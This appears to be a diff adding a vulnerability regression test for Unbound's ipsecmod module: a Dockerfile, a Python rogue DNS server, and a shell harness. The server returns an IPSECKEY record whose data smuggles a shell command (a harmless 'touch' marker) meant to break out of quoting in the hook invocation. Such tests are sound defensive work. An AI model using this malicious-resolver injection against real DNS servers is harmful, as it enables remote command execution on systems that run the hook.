diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..c58de3f
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,34 @@
+FROM ubuntu:18.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Update package lists and install build-essential (which includes gcc, g++, make)
+RUN apt-get -y update && \
+    apt-get install -y build-essential curl unzip wget libssl-dev libexpat1-dev dnsutils python3 bison flex && \
+    rm -rf /var/lib/apt/lists/*
+
+# Copy the project files into the container
+COPY . /project
+
+# Set the working directory inside the container
+WORKDIR /project
+
+# Build Unbound with ipsecmod support but without unbound-control
+RUN ./configure --enable-ipsecmod --disable-unbound-control && \
+    make && \
+    make install
+
+# Create a test directory and copy our test files
+RUN mkdir -p /test
+COPY dns_server.py /test/
+COPY test_script.sh /test/
+
+# Create a simple test script that will run everything
+RUN echo '#!/bin/bash' > /test/run_test.sh && \
+    echo 'cd /test' >> /test/run_test.sh && \
+    echo 'bash /test/test_script.sh' >> /test/run_test.sh && \
+    echo 'bash /test/test_vulnerability.sh' >> /test/run_test.sh && \
+    chmod +x /test/run_test.sh
+
+# Run the test
+CMD ["/test/run_test.sh"]
\ No newline at end of file
diff --git a/dns_server.py b/dns_server.py
new file mode 100644
index 0000000..b633523
--- /dev/null
+++ b/dns_server.py
@@ -0,0 +1,153 @@
+#!/usr/bin/env python3
+import socket
+import struct
+import threading
+import time
+import base64
+import sys
+import os
+
+# Ensure we're writing logs to a file
+log_file = open('/tmp/dns_server.log', 'w')
+
+def log(message):
+    print(message, file=log_file)
+    log_file.flush()
+    print(message, file=sys.stderr)
+
+log("DNS Server script starting")
+
+# DNS server that responds with a malicious IPSECKEY record
+class DNSServer:
+    def __init__(self, host="127.0.0.1", port=53):
+        self.host = host
+        self.port = port
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        # Allow reuse of the address
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        try:
+            self.socket.bind((host, port))
+            log(f"DNS Server bound to {host}:{port}")
+        except Exception as e:
+            log(f"Error binding to {host}:{port}: {e}")
+            # Try a different port if 53 is in use
+            if port == 53:
+                log("Trying port 5300 instead")
+                self.port = 5300
+                self.socket.bind((host, 5300))
+                log(f"DNS Server bound to {host}:5300")
+        self.running = False
+
+    def start(self):
+        self.running = True
+        log(f"DNS Server started on {self.host}:{self.port}")
+        while self.running:
+            try:
+                data, addr = self.socket.recvfrom(512)
+                log(f"Received query from {addr}")
+                response = self.create_response(data)
+                self.socket.sendto(response, addr)
+                log(f"Sent response to {addr}")
+            except Exception as e:
+                log(f"Error: {e}")
+
+    def stop(self):
+        self.running = False
+        self.socket.close()
+
+    def create_response(self, query):
+        # Parse the query
+        transaction_id = query[:2]
+        flags = query[2:4]
+        questions = struct.unpack("!H", query[4:6])[0]
+        
+        # Extract the domain name from the query
+        domain_parts = []
+        offset = 12  # Start after the header
+        while True:
+            length = query[offset]
+            if length == 0:
+                break
+            offset += 1
+            domain_parts.append(query[offset:offset+length].decode())
+            offset += length
+        domain = ".".join(domain_parts)
+        log(f"Query for domain: {domain}")
+        
+        # Create the response header
+        response = transaction_id  # Transaction ID
+        response += struct.pack("!H", 0x8580)  # Flags: QR=1, AA=1, RD=1, RA=1
+        response += struct.pack("!H", questions)  # Questions count
+        response += struct.pack("!H", 2)  # Answer count (A + IPSECKEY)
+        response += struct.pack("!H", 0)  # Authority count
+        response += struct.pack("!H", 0)  # Additional count
+        
+        # Copy the question section from the query
+        qname_end = offset + 1  # +1 for the terminating zero byte
+        qtype_qclass = query[qname_end:qname_end+4]  # QTYPE and QCLASS
+        response += query[12:qname_end+4]  # Copy question section
+        
+        # Add A record answer
+        response += struct.pack("!H", 0xC00C)  # Compressed name pointer to question
+        response += struct.pack("!H", 1)  # Type: A
+        response += struct.pack("!H", 1)  # Class: IN
+        response += struct.pack("!L", 300)  # TTL: 300 seconds
+        response += struct.pack("!H", 4)  # RDLENGTH: 4 bytes
+        response += socket.inet_aton("127.0.0.1")  # RDATA: 127.0.0.1
+        
+        # Add IPSECKEY record with command injection payload
+        response += struct.pack("!H", 0xC00C)  # Compressed name pointer to question
+        response += struct.pack("!H", 45)  # Type: IPSECKEY
+        response += struct.pack("!H", 1)  # Class: IN
+        response += struct.pack("!L", 300)  # TTL: 300 seconds
+        
+        # IPSECKEY RDATA
+        # Format: precedence(1) gateway_type(1) algorithm(1) gateway(var) public_key(var)
+        ipseckey_rdata = bytes([
+            10,  # precedence
+            1,   # gateway_type: IPv4
+            2    # algorithm: RSA
+        ])
+        ipseckey_rdata += socket.inet_aton("127.0.0.1")  # gateway: IPv4 address
+        
+        # Command injection payload
+        # We need a payload that, when base64 encoded, will contain characters that can break out of quotes
+        # The simplest approach is to use a payload that will produce a base64 string containing \"
+        # followed by our command and a comment character
+        
+        # This is a simpler payload that should work
+        payload = b'\\\"\\; touch /tmp/command_injection_successful; #'
+        
+        # Print the base64 encoding of our payload for debugging
+        log(f"Payload: {payload}")
+        log(f"Base64 encoded payload: {base64.b64encode(payload).decode()}")
+        
+        # Add the payload to the IPSECKEY record
+        ipseckey_rdata += payload
+        
+        # Add RDLENGTH and RDATA to response
+        response += struct.pack("!H", len(ipseckey_rdata))  # RDLENGTH
+        response += ipseckey_rdata  # RDATA
+        
+        return response
+
+# Start the DNS server
+if __name__ == "__main__":
+    log("DNS Server main function starting")
+    server = DNSServer()
+    server_thread = threading.Thread(target=server.start)
+    server_thread.daemon = True
+    server_thread.start()
+    
+    log("DNS Server thread started")
+    log(f"DNS Server port: {server.port}")
+    
+    # Write the port to a file so the test script can read it
+    with open('/tmp/dns_server_port', 'w') as f:
+        f.write(str(server.port))
+    
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        server.stop()
\ No newline at end of file
diff --git a/test_script.sh b/test_script.sh
new file mode 100644
index 0000000..501cb0d
--- /dev/null
+++ b/test_script.sh
@@ -0,0 +1,83 @@
+#!/bin/bash
+
+# Create the test script
+cat > /test/test_vulnerability.sh << 'EOF'
+#!/bin/bash
+set -x  # Enable debug mode to see each command executed
+
+echo "#!/bin/sh" > /tmp/ipsecmod_hook.sh
+echo "echo \"IPSECMOD hook called with: \$@\" >> /tmp/hook_called.log" >> /tmp/ipsecmod_hook.sh
+chmod +x /tmp/ipsecmod_hook.sh
+TEST_FILE="/tmp/command_injection_successful"
+rm -f $TEST_FILE /tmp/hook_called.log
+
+cat > /test/unbound.conf << 'CONF'
+server:
+    verbosity: 5
+    interface: 127.0.0.1
+    port: 5353
+    access-control: 127.0.0.0/8 allow
+    chroot: ""
+    username: ""
+    directory: "/tmp"
+    logfile: "/tmp/unbound.log"
+    pidfile: "/tmp/unbound.pid"
+    module-config: "ipsecmod validator iterator"
+    # Enable ipsecmod
+    ipsecmod-enabled: yes
+    # Set the hook script
+    ipsecmod-hook: "/tmp/ipsecmod_hook.sh"
+    # Whitelist domain for testing
+    ipsecmod-whitelist: "vulnerable.test."
+    ipsecmod-strict: no
+    # Use our own DNS server for testing
+    do-not-query-localhost: no
+    # Forward all queries to our malicious DNS server
+    forward-zone:
+        name: "."
+        forward-addr: 127.0.0.1@53
+CONF
+
+echo "Starting DNS server for testing..."
+python3 /test/dns_server.py 2>/tmp/dns_server.log &
+DNS_SERVER_PID=$!
+sleep 2
+
+echo "Starting Unbound server..."
+unbound -d -c /test/unbound.conf &
+UNBOUND_PID=$!
+sleep 3
+
+echo "Sending DNS query to trigger vulnerability..."
+dig @127.0.0.1 -p 5353 vulnerable.test. A
+sleep 2
+
+# Print debug logs
+echo "DNS Server Log:"
+cat /tmp/dns_server.log
+
+echo "Unbound Log:"
+cat /tmp/unbound.log
+
+if [ -f "$TEST_FILE" ]; then
+    echo "VULNERABILITY TEST FAILED: Command injection successful!"
+    if [ -f "/tmp/hook_called.log" ]; then
+        echo "Hook was called:"
+        cat /tmp/hook_called.log
+    fi
+    kill $UNBOUND_PID $DNS_SERVER_PID 2>/dev/null || true
+    exit 1
+else
+    echo "VULNERABILITY TEST PASSED: Command injection not successful."
+    if [ -f "/tmp/hook_called.log" ]; then
+        echo "Hook was called:"
+        cat /tmp/hook_called.log
+    else
+        echo "Hook was not called at all."
+    fi
+    kill $UNBOUND_PID $DNS_SERVER_PID 2>/dev/null || true
+    exit 0
+fi
+EOF
+
+chmod +x /test/test_vulnerability.sh
\ No newline at end of file
